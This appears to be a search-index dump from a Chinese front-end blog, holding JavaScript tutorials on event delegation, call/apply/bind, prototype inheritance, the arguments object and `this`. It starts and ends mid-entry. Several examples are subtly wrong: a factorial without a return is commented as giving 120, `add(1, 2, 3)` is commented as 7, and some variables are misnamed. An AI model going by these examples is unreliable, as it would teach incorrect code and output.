中的事件绑定、事件监听、事件委托","slug":"2016-12-js-event-listener","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:02.000Z","comments":true,"path":"note/ebeaea04.html","link":"","permalink":"https://ru23.com/note/ebeaea04.html","excerpt":"事件绑定 要想让 JavaScript对用户的操作作出响应，首先要对 DOM 元素绑定事件处理函数。所谓事件处理函数，就是处理用户操作的函数，不同的操作对应不同的名称","text":"事件绑定 要想让 JavaScript对用户的操作作出响应，首先要对 DOM 元素绑定事件处理函数。所谓事件处理函数，就是处理用户操作的函数，不同的操作对应不同的名称 在JavaScript中，有三种常用的绑定事件的方法 在DOM元素中直接绑定； 在JavaScript代码中绑定； 绑定事件监听函数 在DOM中直接绑定事件1234567&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;hello()&quot;&gt;&lt;script&gt;function hello()&#123; alert(&quot;hello world!&quot;);&#125;&lt;/script&gt; 在JavaScript代码中绑定事件 在JavaScript代码中（即script标签内）绑定事件可以使JavaScript代码与HTML标签分离，文档结构清晰，便于管理和开发 1234567&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn&quot;&gt;&lt;script&gt;document.getElementById(&quot;btn&quot;).onclick = function()&#123; alert(&quot;hello world!&quot;);&#125;&lt;/script&gt; 使用事件监听绑定事件 关于事件监听，W3C规范中定义了3个事件阶段，依次是捕获阶段、目标阶段、冒泡阶段 起初Netscape制定了JavaScript的一套事件驱动机制（即事件捕获）。随即IE也推出了自己的一套事件驱动机制（即事件冒泡）。最后W3C规范了两种事件机制，分为捕获阶段、目标阶段、冒泡阶段。IE8以前IE一直坚持自己的事件机制（前端人员一直头痛的兼容性问题），IE9以后IE也支持了W3C规范 W3C规范 语法 1element.addEventListener(event, function, useCapture) event : （必需）事件名，支持所有DOM事件。 function：（必需）指定要事件触发时执行的函数。 useCapture：（可选）指定事件是否在捕获或冒泡阶段执行。true，捕获。false，冒泡。默认false 注：IE8 以下不支持 12345678&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn1&quot;&gt;&lt;script&gt;document.getElementById(&quot;btn1&quot;).addEventListener(&quot;click&quot;,hello);function hello()&#123; alert(&quot;hello world!&quot;);&#125;&lt;/script&gt; IE标准 语法： 1element.attachEvent(event, function) event：（必需）事件类型。需加“on“，例如：onclick。 function：（必需）指定要事件触发时执行的函数 12345678&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn2&quot;&gt;&lt;script&gt;document.getElementById(&quot;btn2&quot;).attachEvent(&quot;onclick&quot;,hello);function hello()&#123; alert(&quot;hello world!&quot;);&#125;&lt;/script&gt; 事件监听的优点 可以绑定多个事件 1234567891011&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn3&quot;&gt;&lt;script&gt;var btn3 = document.getElementById(&quot;btn3&quot;);btn3.onclick = function()&#123; alert(&quot;hello 1&quot;); //不执行&#125;btn3.onclick = function()&#123; alert(&quot;hello 2&quot;); //执行&#125;&lt;/script&gt; 常规的事件绑定只执行最后绑定的事件 1234567891011121314&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn4&quot;&gt;&lt;script&gt;var btn4 = document.getElementById(&quot;btn4&quot;);btn4.addEventListener(&quot;click&quot;,hello1);btn4.addEventListener(&quot;click&quot;,hello2);function hello1()&#123; alert(&quot;hello 1&quot;);&#125;function hello2()&#123; alert(&quot;hello 2&quot;);&#125;&lt;/script&gt; 两个事件都执行了 可以解除相应的绑定 123456789101112131415&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn5&quot;&gt;&lt;script&gt;var btn5 = document.getElementById(&quot;btn5&quot;);btn5.addEventListener(&quot;click&quot;,hello1);//执行了btn5.addEventListener(&quot;click&quot;,hello2);//不执行btn5.removeEventListener(&quot;click&quot;,hello2);function hello1()&#123; alert(&quot;hello 1&quot;);&#125;function hello2()&#123; alert(&quot;hello 2&quot;);&#125;&lt;/script&gt; 封装事件监听 12345678910111213141516171819202122232425&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn5&quot;&gt;//绑定监听事件function addEventHandler(target,type,fn)&#123; if(target.addEventListener)&#123; target.addEventListener(type,fn); &#125;else&#123; target.attachEvent(&quot;on&quot;+type,fn); &#125;&#125;//移除监听事件function removeEventHandler(target,type,fn)&#123; if(target.removeEventListener)&#123; target.removeEventListener(type,fn); &#125;else&#123; target.detachEvent(&quot;on&quot;+type,fn); &#125;&#125;//测试var btn5 = document.getElementById(&quot;btn5&quot;);addEventHandler(btn5,&quot;click&quot;,hello1);//添加事件hello1addEventHandler(btn5,&quot;click&quot;,hello2);//添加事件hello2removeEventHandler(btn5,&quot;click&quot;,hello1);//移除事件hello1 事件委托 事件委托就是利用冒泡的原理，把事件加到父元素或祖先元素上，触发执行效果 12345678910&lt;input type=&quot;button&quot; value=&quot;click me&quot; id=&quot;btn6&quot;&gt;var btn6 = document.getElementById(&quot;btn6&quot;);document.onclick = function(event)&#123; event = event || window.event; var target = event.target || event.srcElement; if(target == btn6)&#123; alert(btn5.value); &#125;&#125; 事件委托优点 提高JavaScript性能。事件委托可以显著的提高事件的处理速度，减少内存的占用 传统写法 123456789101112131415161718192021&lt;ul id=&quot;list&quot;&gt; &lt;li id=&quot;item1&quot; &gt;item1&lt;/li&gt; &lt;li id=&quot;item2&quot; &gt;item2&lt;/li&gt; &lt;li id=&quot;item3&quot; &gt;item3&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;var item1 = document.getElementById(&quot;item1&quot;);var item2 = document.getElementById(&quot;item2&quot;);var item3 = document.getElementById(&quot;item3&quot;);item1.onclick = function()&#123; alert(&quot;hello item1&quot;);&#125;item2.onclick = function()&#123; alert(&quot;hello item2&quot;);&#125;item3.onclick = function()&#123; alert(&quot;hello item3&quot;);&#125;&lt;/script&gt; 事件委托 12345678910111213141516171819202122&lt;ul id=&quot;list&quot;&gt; &lt;li id=&quot;item1&quot; &gt;item1&lt;/li&gt; &lt;li id=&quot;item2&quot; &gt;item2&lt;/li&gt; &lt;li id=&quot;item3&quot; &gt;item3&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;var item1 = document.getElementById(&quot;item1&quot;);var item2 = document.getElementById(&quot;item2&quot;);var item3 = document.getElementById(&quot;item3&quot;);document.addEventListener(&quot;click&quot;,function(event)&#123; var target = event.target; if(target == item1)&#123; alert(&quot;hello item1&quot;); &#125;else if(target == item2)&#123; alert(&quot;hello item2&quot;); &#125;else if(target == item3)&#123; alert(&quot;hello item3&quot;); &#125;&#125;)&lt;/script&gt; 动态的添加DOM元素，不需要因为元素的改动而修改事件绑定 传统写法 123456789101112131415161718192021222324&lt;ul id=&quot;list&quot;&gt; &lt;li id=&quot;item1&quot; &gt;item1&lt;/li&gt; &lt;li id=&quot;item2&quot; &gt;item2&lt;/li&gt; &lt;li id=&quot;item3&quot; &gt;item3&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;var list = document.getElementById(&quot;list&quot;);var item = list.getElementsByTagName(&quot;li&quot;);for(var i=0;i&lt;item.length;i++)&#123; (function(i)&#123; item[i].onclick = function()&#123; alert(item[i].innerHTML); &#125; &#125;)(i)&#125;var node=document.createElement(&quot;li&quot;);var textnode=document.createTextNode(&quot;item4&quot;);node.appendChild(textnode);list.appendChild(node);&lt;/script&gt; 点击item1到item3都有事件响应，但是点击item4时，没有事件响应。说明传统的事件绑定无法对动态添加的元素而动态的添加事件。 事件委托 12345678910111213141516171819202122&lt;ul id=&quot;list&quot;&gt; &lt;li id=&quot;item1&quot; &gt;item1&lt;/li&gt; &lt;li id=&quot;item2&quot; &gt;item2&lt;/li&gt; &lt;li id=&quot;item3&quot; &gt;item3&lt;/li&gt;&lt;/ul&gt;&lt;script&gt;var list = document.getElementById(&quot;list&quot;);document.addEventListener(&quot;click&quot;,function(event)&#123; var target = event.target; if(target.nodeName == &quot;LI&quot;)&#123; alert(target.innerHTML); &#125;&#125;)var node=document.createElement(&quot;li&quot;);var textnode=document.createTextNode(&quot;item4&quot;);node.appendChild(textnode);list.appendChild(node);&lt;/script&gt; 当点击item4时，item4有事件响应。说明事件委托可以为新添加的DOM元素动态的添加事件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"事件","slug":"事件","permalink":"https://ru23.com/tags/事件/"}]},{"title":"JS 中的 call、apply、bind 方法","slug":"2016-12-call-apply-bind","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T09:45:11.806Z","comments":true,"path":"note/580a1014.html","link":"","permalink":"https://ru23.com/note/580a1014.html","excerpt":"call()、apply()、bind()都是函数对象的一个方法，它们的作用都是改变函数的调用对象。它的使用极大的简化了代码的调用 一、方法定义 call方法 语法 1fun.call(thisArg[, arg1[, arg2[, ...]]]) thisArg：fun函数运行时指定的this值，可能的值为： 不传，或者传null，undefined， this指向window对象 传递另一个函数的函数名fun2，this指向函数fun2的引用值为原始值(数字，字符串，布尔值),this会指向该原始值的自动包装对象，如 String、Number、Boolean 传递一个对象，函数中的this指向这个对象","text":"call()、apply()、bind()都是函数对象的一个方法，它们的作用都是改变函数的调用对象。它的使用极大的简化了代码的调用 一、方法定义 call方法 语法 1fun.call(thisArg[, arg1[, arg2[, ...]]]) thisArg：fun函数运行时指定的this值，可能的值为： 不传，或者传null，undefined， this指向window对象 传递另一个函数的函数名fun2，this指向函数fun2的引用值为原始值(数字，字符串，布尔值),this会指向该原始值的自动包装对象，如 String、Number、Boolean 传递一个对象，函数中的this指向这个对象 apply方法 语法：apply([thisObj[,argArray]]) 定义：应用某一对象的一个方法，用另一个对象替换当前对象。 说明：apply的第一个参数thisObj和call方法的一样，第二个参数argArray为一个传参数组thisObj如果未传，那么 Global对象被用作 thisObj bind方法 在ECMAScript5中扩展了叫bind的方法（IE6,7,8不支持） 语法：bind([thisObj[,arg1[, arg2[, [,.argN]]]]]) 定义：应用某一对象的一个方法，用另一个对象替换当前对象。 说明：bind的thisObj参数也和call方法一样，thisObj如果未传，那么 Global对象被用作 thisObj。arg1 … argN可传可不传。如果不传，可以在调用的时候再传。如果传了，调用的时候则可以不传，调用的时候如果你还是传了，则不生效 12345678910111213var person = &#123; name:&quot;tsrot&quot;, age:24, sayHello:function(age)&#123; console.log(this.name); console.log(age); &#125; &#125;;var son = &#123; name:&quot;xieliqun&quot; &#125;;var boundFunc = person.sayHello.bind(son);boundFunc(25); 12var boundFunc = person.sayHello.bind(son,25);boundFunc(); 12var boundFunc = person.sayHello.bind(son,25);boundFunc(30); 二、call、apply、bind的区别 call的arg传参需一个一个传，apply则直接传一个数组 123456function hello(name,age)&#123; console.log(name); console.log(age); &#125;hello.call(this,&quot;tsrot&quot;,24);hello.apply(this,[&quot;tsrot&quot;,24]); call和apply直接执行函数，而bind需要再一次调用 1234567891011var obj = &#123; x: 81, &#125;;var foo = &#123; getX: function() &#123; return this.x; &#125; &#125;console.log(foo.getX.bind(obj)()); console.log(foo.getX.call(obj)); console.log(foo.getX.apply(obj)); 三、运用场景 实现继承 1234567891011function Animal(name) &#123; this.name = name; this.showName = function () &#123; console.log(this.name); &#125; &#125;function Cat(name) &#123; Animal.call(this, name); &#125;var cat = new Cat(&apos;Black Cat&apos;);cat.showName(); 数组追加 1234var array1 = [1 , 2 , 3, 5];var array2 = [&quot;xie&quot; , &quot;li&quot; , &quot;qun&quot; , &quot;tsrot&quot;];Array.prototype.push.apply(array1, array2);console.log(array1); 获取数组中的最大值和最小值 12345var num = [1,3,5,7,2,-10,11];var maxNum = Math.max.apply(Math, num);var minNum = Math.min.apply(Math, num);console.log(maxNum); console.log(minNum); 将伪数组转化为数组 1234567var fakeArr = &#123;0:&apos;a&apos;,1:&apos;b&apos;,length:2&#125;;var arr1 = Array.prototype.slice.call(fakeArr);console.log(arr1[0]); var arr2 = [].slice.call(fakeArr);console.log(arr2[0]); arr1.push(&quot;c&quot;);console.log(arr1); 保存this变量 1234567891011121314151617var foo = &#123; bar : 1, eventBind: function()&#123; var _this = this ; $(&apos;.someClass&apos;).on(&apos;click&apos;,function(event) &#123; console.log(_this.bar); &#125;); &#125; &#125;var foo = &#123; bar : 1, eventBind: function()&#123; $(&apos;.someClass&apos;).on(&apos;click&apos;,function(event) &#123; console.log(this.bar); &#125;.bind(this)); &#125; &#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"OOP之面向对象","slug":"2016-12-js-oop","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:02.008Z","comments":true,"path":"note/6c17c77b.html","link":"","permalink":"https://ru23.com/note/6c17c77b.html","excerpt":"一般面向对象包含：继承，封装，多态，抽象 对象形式的继承 浅拷贝","text":"一般面向对象包含：继承，封装，多态，抽象 对象形式的继承 浅拷贝 12345678910111213141516171819202122232425var Person = &#123; name: 'allin', age: 18, address: &#123; home: 'home', office: 'office', &#125; sclools: ['x','z'],&#125;;var programer = &#123; language: 'js',&#125;;function extend(p, c)&#123; var c = c || &#123;&#125;; for( var prop in p)&#123; c[prop] = p[prop]; &#125;&#125;extend(Person, programer);programer.name; // allinprogramer.address.home; // homeprogramer.address.home = 'house'; //housePerson.address.home; // house 从上面的结果看出，浅拷贝的缺陷在于修改了子对象中引用类型的值，会影响到父对象中的值，因为在浅拷贝中对引用类型的拷贝只是拷贝了地址，指向了内存中同一个副本 深拷贝 1234567891011function extendDeeply(p, c)&#123; var c = c || &#123;&#125;; for (var prop in p)&#123; if(typeof p[prop] === \"object\")&#123; c[prop] = (p[prop].constructor === Array)?[]:&#123;&#125;; extendDeeply(p[prop], c[prop]); &#125;else&#123; c[prop] = p[prop]; &#125; &#125;&#125; 利用递归进行深拷贝，这样子对象的修改就不会影响到父对象 123extendDeeply(Person, programer);programer.address.home = 'allin';Person.address.home; // home 利用call和apply继承 12345678function Parent()&#123; this.name = \"abc\"; this.address = &#123;home: \"home\"&#125;;&#125;function Child()&#123; Parent.call(this); this.language = \"js\"; &#125; ES5中的Object.create()123var p = &#123; name : 'allin'&#125;;var obj = Object.create(o);obj.name; // allin Object.create()作为new操作符的替代方案是ES5之后才出来的。我们也可以自己模拟该方法： 12345678910//模拟Object.create()方法function myCreate(o)&#123; function F()&#123;&#125;; F.prototype = o; o = new F(); return o;&#125;var p = &#123; name : 'allin'&#125;;var obj = myCreate(o);obj.name; // allin 目前，各大浏览器的最新版本（包括IE9）都部署了这个方法。如果遇到老式浏览器，可以用下面的代码自行部署 1234567 if (!Object.create) &#123; Object.create = function (o) &#123; function F() &#123;&#125; F.prototype = o; return new F(); &#125;; &#125; 类的继承 Object.create() 123456789function Person(name, age)&#123;&#125;Person.prototype.headCount = 1;Person.prototype.eat = function()&#123; console.log('eating...');&#125;function Programmer(name, age, title)&#123;&#125;Programmer.prototype = Object.create(Person.prototype); //建立继承关系Programmer.prototype.constructor = Programmer; // 修改constructor的指向 调用父类方法 12345678910111213141516171819202122function Person(name, age)&#123; this.name = name; this.age = age;&#125;Person.prototype.headCount = 1;Person.prototype.eat = function()&#123; console.log('eating...');&#125;function Programmer(name, age, title)&#123; Person.apply(this, arguments); // 调用父类的构造器&#125;Programmer.prototype = Object.create(Person.prototype);Programmer.prototype.constructor = Programmer;Programmer.prototype.language = \"js\";Programmer.prototype.work = function()&#123; console.log('i am working code in '+ this.language); Person.prototype.eat.apply(this, arguments); // 调用父类上的方法&#125; 封装 命名空间 js是没有命名空间的，因此可以用对象模拟 12345678910var app = &#123;&#125;; // 命名空间app//模块1app.module1 = &#123; name: 'allin', f: function()&#123; console.log('hi robot'); &#125;&#125;;app.module1.name; // \"allin\"app.module1.f(); // hi robot 静态成员 123456789function Person(name)&#123; var age = 100; this.name = name;&#125;//静态成员Person.walk = function()&#123; console.log('static');&#125;;Person.walk(); // static 私有与公有 1234567891011121314151617function Person(id)&#123; // 私有属性与方法 var name = 'allin'; var work = function()&#123; console.log(this.id); &#125;; //公有属性与方法 this.id = id; this.say = function()&#123; console.log('say hello'); work.call(this); &#125;;&#125;;var p1 = new Person(123);p1.name; // undefinedp1.id; // 123p1.say(); // say hello 123 模块化 1234567891011var moduleA;moduleA = function() &#123; var prop = 1; function func() &#123;&#125; return &#123; func: func, prop: prop &#125;;&#125;(); // 立即执行匿名函数 多态 模拟方法重载 arguments属性可以取得函数调用的实参个数，可以利用这一点模拟方法的重载 12345678function demo(a, b )&#123; console.log(demo.length); // 得到形参个数 console.log(arguments.length); //得到实参个数 console.log(arguments[0]); // 第一个实参 4 console.log(arguments[1]); // 第二个实参 5&#125;demo(4, 5, 6); 123456789101112131415161718192021222324252627282930313233343536373839//实现可变长度实参的相加function add()&#123; var total = 0; for( var i = arguments.length - 1; i &gt;= 0; i--)&#123; total += arguments[i]; &#125; return total;&#125;console.log(add(1)); // 1console.log(add(1, 2, 3)); // 7// 参数不同的情况function fontSize()&#123; var ele = document.getElementById('js'); if(arguments.length == 0)&#123; return ele.style.fontSize; &#125;else&#123; ele.style.fontSize = arguments[0]; &#125;&#125;fontSize(18);console.log(fontSize());// 类型不同的情况function setting()&#123; var ele = document.getElementById('js'); if(typeof arguments[0] === \"object\")&#123; for(var p in arguments[0])&#123; ele.style[p] = arguments[0][p]; &#125; &#125;else&#123; ele.style.fontSize = arguments[0]; ele.style.backgroundColor = arguments[1]; &#125;&#125;setting(18, 'red');setting(&#123;fontSize:20, backgroundColor: 'green'&#125;); 方法重写 1234567891011function F()&#123;&#125;var f = new F();F.prototype.run = function()&#123; console.log('F');&#125;f.run(); // Ff.run = function()&#123; console.log('fff');&#125;f.run(); // fff 抽象类 在构造器中 throw new Error(&#39;&#39;); 抛异常。这样防止这个类被直接调用 12345678910111213141516171819202122232425function DetectorBase() &#123; throw new Error('Abstract class can not be invoked directly!');&#125;DetectorBase.prototype.detect = function() &#123; console.log('Detection starting...');&#125;;DetectorBase.prototype.stop = function() &#123; console.log('Detection stopped.');&#125;;DetectorBase.prototype.init = function() &#123; throw new Error('Error');&#125;;// var d = new DetectorBase();// Uncaught Error: Abstract class can not be invoked directly!function LinkDetector() &#123;&#125;LinkDetector.prototype = Object.create(DetectorBase.prototype);LinkDetector.prototype.constructor = LinkDetector;var l = new LinkDetector();console.log(l); //LinkDetector &#123;&#125;__proto__: LinkDetectorl.detect(); //Detection starting...l.init(); //Uncaught Error: Error","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"面向对象","slug":"面向对象","permalink":"https://ru23.com/tags/面向对象/"}]},{"title":"arguments详解","slug":"2016-12-arguments详解","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T09:45:05.821Z","comments":true,"path":"note/4cc35512.html","link":"","permalink":"https://ru23.com/note/4cc35512.html","excerpt":"每个函数都会有一个Arguments对象实例arguments，它引用着函数的实参，可以用数组下标的方式”[]”引用arguments的元素。arguments.length为函数实参个数，arguments.callee引用函数自身。","text":"每个函数都会有一个Arguments对象实例arguments，它引用着函数的实参，可以用数组下标的方式”[]”引用arguments的元素。arguments.length为函数实参个数，arguments.callee引用函数自身。 Arguments对象介绍Arguments对象是一个伪数组对象，它有length属性，可以arguments[i]来访问对象中的元素，但它不能用数组的一些方法，例如push，pop，slice等。 Arguments的length属性Arguments的length属性，表示function函数实际所传参数的个数。函数名点length可以获取函数期望的传参个数。 1234567891011function argTest(a,b,c)&#123; var t = arguments.length; //实际传参个数 var e = argTest.length; //期望传参个数 console.log(t); console.log(e);&#125;argTest(11,12); //t=2,e=3argTest(11,12,13); //t=3,e=3argTest(11,12,13,14); //t=4,e=3 Arguments的参数访问Arguments对象的参数访问可以用arguments[i]来访问函数所传的参数。 1234567891011function argTest(a,b,c)&#123; var arg = []; for(var i=0;i&lt;arguments.length;i++)&#123; arg.push(arguments[i]); &#125; console.log(arg);&#125;argTest(11,12); //[11, 12]argTest(11,12,13); //[11, 12, 13]argTest(11,12,13,14); //[11, 12, 13, 14] Arguments的callee调用Arguments的callee属性可以调用函数本身，当函数正在执行时才可调用，可以实现方法的递归调用。 123456function argTest(a,b,c)&#123; var e = arguments.callee.toString(); console.log(e);&#125;argTest(); //打印出函数本身 Function对象caller属性Function对象的caller属性可以指向当前函数的调用者，当调用者函数正在执行时才可调用， 123456789101112131415161718192021function callerTest()&#123; if(callerTest.caller)&#123; var caller = callerTest.caller.toString(); console.log(caller); &#125;else&#123; console.log(\"no caller\") &#125;&#125;function handler()&#123; callerTest();&#125;function handlerToHandler()&#123; handler();&#125;callerTest(); //no callerhandler(); //返回调用者handler函数handlerToHandler(); //返回调用者handler函数 Arguments的作用方法重载方法重载是指在一个类中定义多个同名的方法，但要求每个方法具有不同的参数的类型或参数的个数。Javascript并没有重载函数的功能，但是Arguments对象能够模拟重载。 123456789101112131415//普通方法实现方法重载function test(a,b,c)&#123; if(a &amp;&amp; b &amp;&amp; c)&#123; console.log(a + b + c); &#125;else if(a &amp;&amp; b)&#123; console.log(a + b); &#125;else&#123; console.log(a); &#125;&#125;test(); //undefinedtest(11,12); //23test(11,12,13) //36 12345678910111213//Arguments对象实现方法重载function test()&#123; var sum = 0; for(var i=0;i&lt;arguments.length;i++)&#123; sum += arguments[i]; &#125; console.log(sum);&#125;test(); //0test(11,12); //23test(11,12,13); //36 12345678910111213//ES6实现方法重载function test(...nums)&#123; var sum = 0; for(var i=0;i&lt;nums.length;i++)&#123; sum += nums[i]; &#125; console.log(sum);&#125;test(); //0test(11,12); //23test(11,12,13); //36 递归调用这样的好处就是可以实现匿名函数的递归调用。 123456789101112//实现一个阶乘函数function factorial(n)&#123; if(n == 1)&#123; return 1; &#125;else&#123; n * arguments.callee(n-1); &#125;&#125;factorial(1); //1factorial(5); //120 不定参问题比如说，我想判断你传给我的一些数字的大小，取出最大的那个 123456789101112function max()&#123; var maxNum = Number.NEGATIVE_INFINITY;; for(var i=0;i&lt;arguments.length;i++)&#123; if(arguments[i]&gt; maxNum)&#123; maxNum = arguments[i]; &#125; &#125; return maxNum;&#125;max(1,2,3,11,4,10); //11max(2,-10,22,11); //22","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"OOP之类与对象","slug":"2016-12-js-oop-and-class","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:02.006Z","comments":true,"path":"note/7e6522d0.html","link":"","permalink":"https://ru23.com/note/7e6522d0.html","excerpt":"对象 对象的含义 所谓对象，就是一种无序的数据集合，由若干个“键值对”（key-value）构成","text":"对象 对象的含义 所谓对象，就是一种无序的数据集合，由若干个“键值对”（key-value）构成 对象的创建 使用new运算符创建Object 12var p = new Object();p.name = \"Tony\"; 使用对象字面量的形式 12345678910111213141516171819//对象字面量形式var p =&#123; name: \"tony\", work: function()&#123; console.log(\"working....\"); &#125;, _age: 18, get age()&#123; return this._age; &#125;, set age(val)&#123; if( val &lt;0 || val &gt; 150)&#123; throw new Error(\"invalid value\"); &#125;else&#123; this._age = val; &#125; &#125;&#125;console.log(p.name); 对象的基本操作 成员属性的添加 123456789101112// Object.defineProperty()方法Object.defineProperty(p, \"age\",&#123;value: 18, writable: false&#125;);//Object.defineProperties()方法 添加多个属性Object.defineProperties(p, &#123; salary:&#123; value: 1000, writable: false &#125;, gender:&#123; value: true &#125;&#125;); 成员的遍历 使用 for..in语句 Object.keys()方法 返回一个包含对象键名的字符串数组 1234567var o =&#123;&#125;;o.name = \"jack\";o.age = 20;for(var i in o)&#123; console.log(o[i]);&#125; // jack, 20Object.keys(o); // [\"name\", \"age\"] 检查对象是否有某个属性 in 操作符 Object.hasOwnProperty()方法 123var o = &#123;name: \"mariya\"&#125;\"name\" in o; // trueo.hasOwnProperty(\"name\"); // true 得到对象的属性特性描述 Object.getOwnPropertyDescriptor(obj,property) 1234Object.getOwnPropertyDescriptor(o, \"name\");//Object &#123;// value: \"mariya\", writable: true, enumerable: true, configurable: true&#125; 删除属性 delete运算符,但有些对象的属性是删除不了的 12delete o.name; //trueo.name; // undefined Constructor属性 constructor始终指向创建当前对象的构造函数 12345678var arr = [];console.log(arr.constructor === Array); // truevar Foo = function() &#123;&#125;;console.log(Foo.constructor === Function); // true// 由构造函数实例化一个obj对象var obj = new Foo();console.log(obj.constructor === Foo); // trueconsole.log(obj.constructor.constructor === Function); // true 每个函数都有一个默认的属性prototype，而这个prototype的constructor默认指向这个函数 类的创建 虽然js是门基于对象的语言，但是没有类这一概念的，虽然保留了class的关键字，但在ES6之前是无法使用的。所以，可以用构造函数模拟类的创建，也就是伪类。 所谓”构造函数”，其实就是一个普通函数，但是内部使用了this变量。对构造函数使用new运算符，就能生成实例，并且this变量会绑定在实例对象上 每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承 12345678910//构造函数模式function Person(age, name)&#123; //Class this.age = age; this.name = name;&#125;//将公共的属性或方法放在prototype属性上Person.prototype.headCount = 1;//创建实例对象var p = new Person(19, 'johnsom');var p1 = new Person(20, 'allen'); this this表示当前对象，如果在全局作用范围内使用this，则指代当前页面对象window； 如果在函数中使用this，则this指代什么是根据运行时此函数在什么对象上被调用。 我们还可以使用apply和call两个全局方法来改变函数中this的具体指向 全局代码中的this1console.log(this === window); //true 全局范围内使用this指向window对象 普通的函数调用123function f()&#123;this.name = \"tony\"; // this在运行时指向window对象,在严格模式下则是undefined&#125; 在对象中使用123456var o = &#123; name: \"tony\", print: function()&#123; console.log(this.name); //this指向对象o，但是可以改变其指向 &#125;&#125;; 作为构造函数1new F(); // 函数内部的this指向新创建的对象。 多层嵌套的内部函数1234567891011var name = \"global\";var person = &#123; name : \"person\", hello : function(sth)&#123; var sayhello = function(sth) &#123; console.log(this.name + \" says \" + sth); &#125;; sayhello(sth); &#125;&#125;person.hello(\"hello world\");//global says hello world 在内部函数中，this没有按预想的绑定到外层函数对象上，而是绑定到了全局对象。这里普遍被认为是JavaScript语言的设计错误，因为没有人想让内部函数中的this指向全局对象。一般的处理方式是将this作为变量保存下来，一般约定为that或者self： 123456789101112var name = \"global\";var person = &#123; name : \"person\", hello : function(sth)&#123; var that = this; var sayhello = function(sth) &#123; console.log(that.name + \" says \" + sth); &#125;; sayhello(sth); &#125;&#125;person.hello(\"hello world\");//person says hello world 事件中的this1234var ele = document.getElementById(\"id\");ele.addEventListener('click',function()&#123; console.log(this); //this指向dom元素&#125;); 使用apply和call改变this的指向 apply和call类似，只是后面的参数是通过一个数组传入，而不是分开传入。两者都是将某个函数绑定到某个具体对象上使用，自然此时的this会被显式的设置为第一个参数。两者的方法定义： 12call( thisArg [，arg1，arg2，… ] ); // 参数列表，arg1，arg2，...apply(thisArg [，argArray] ); // 参数数组，argArray 1234567891011var name = 'global';var o = &#123; name: 'job', getName: function()&#123; console.log(this.name); &#125;&#125;;o.getName(); // job//用call或apply改变函数中this的指向o.getName.call(this); // global 简单的总结： 当函数作为对象的方法调用时，this指向该对象。 构造函数中的this指向新创建的对象 嵌套函数中的this不会继承上层函数的this，如果需要，可以用一个变量保存上层函数的this bind（） 该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入bind方法的第一个参数作为this，传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数. 12$(\"#ele\").click(person.hello.bind(person));//相应元素被点击时，输出person says hello world","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"面向对象","slug":"面向对象","permalink":"https://ru23.com/tags/面向对象/"}]},{"title":"JS继承的几种方法总结","slug":"2016-12-js-inherit","date":"2016-12-13T06:55:24.000Z","updated":"2018-10-24T03:46:02.002Z","comments":true,"path":"note/b61cd12f.html","link":"","permalink":"https://ru23.com/note/b61cd12f.html","excerpt":"由于js不像java那样是真正面向对象的语言，js是基于对象的，它没有类的概念 所以，要想实现继承，可以用js的原型prototype机制或者用apply和call方法去实现。在面向对象的语言中，我们使用类来创建一个自定义对象。然而js中所有事物都是对象，那么用什么办法来创建自定义对象呢？ 这就需要用到js的原型：我们可以简单的把prototype看做是一个模版，新创建的自定义对象都是这个模版（prototype）的一个拷贝 （实际上不是拷贝而是链接，只不过这种链接是不可见，新实例化的对象内部有一个看不见的Proto指针，指向原型对象）。","text":"由于js不像java那样是真正面向对象的语言，js是基于对象的，它没有类的概念 所以，要想实现继承，可以用js的原型prototype机制或者用apply和call方法去实现。在面向对象的语言中，我们使用类来创建一个自定义对象。然而js中所有事物都是对象，那么用什么办法来创建自定义对象呢？ 这就需要用到js的原型：我们可以简单的把prototype看做是一个模版，新创建的自定义对象都是这个模版（prototype）的一个拷贝 （实际上不是拷贝而是链接，只不过这种链接是不可见，新实例化的对象内部有一个看不见的Proto指针，指向原型对象）。 1、继承第一种方式：对象冒充 123456789101112131415161718192021222324252627282930blogfunction Parent(username)&#123; this.username = username; this.hello = function()&#123; console.log('hello ' + this.username); &#125; &#125;Parent.prototype.sayMorning = function()&#123; console.log('good morning ' + this.username);&#125; function Child(username,password)&#123; //通过以下3行实现将Parent的属性和方法追加到Child中，从而实现继承 //第一步：this.method是作为一个临时的属性，并且指向Parent所指向的对象， //第二步：执行this.method方法，即执行Parent所指向的对象函数 //第三步：销毁this.method属性，即此时Child就已经拥有了Parent的所有属性和方法 this.method = Parent; this.method(username);//最关键的一行 